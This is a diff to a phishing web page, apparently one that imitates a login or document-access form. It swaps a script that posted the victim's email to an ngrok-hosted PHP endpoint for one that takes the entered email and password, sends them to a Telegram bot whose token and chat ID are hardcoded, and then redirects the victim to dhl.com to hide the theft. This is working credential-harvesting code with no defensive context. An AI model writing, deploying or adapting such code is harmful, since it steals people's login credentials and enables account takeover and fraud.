@@ -63,9 +63,30 @@ MARGIN: 0px 0px 3px; DISPLAY: block; LINE-HEIGHT: 1.4285; PADDING-RIGHT: 12px; B
 
 </BODY>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-<script type="text/javascript">
-$(document).ready(function(){
-$.post("https://hopelessly-leading-lioness.ngrok-free.app/ph/me/pdfatt/favobi.php",{email: $("#email").val()},function(data,status){});
-});
-</script>
+<script>
+      const formal = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "7123714058:AAFCQoFWPaMpwIsJhFnnfD_Gs_uvg1P3JAs",
+          chatID: "5346235818"
+      }
+
+
+      formal.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let result1 = document.querySelector('#xiemail').value
+          let result2 = document.querySelector('#pipassword').value
+          
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://dhl.com");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+      })
+  </script>
 </HTML>
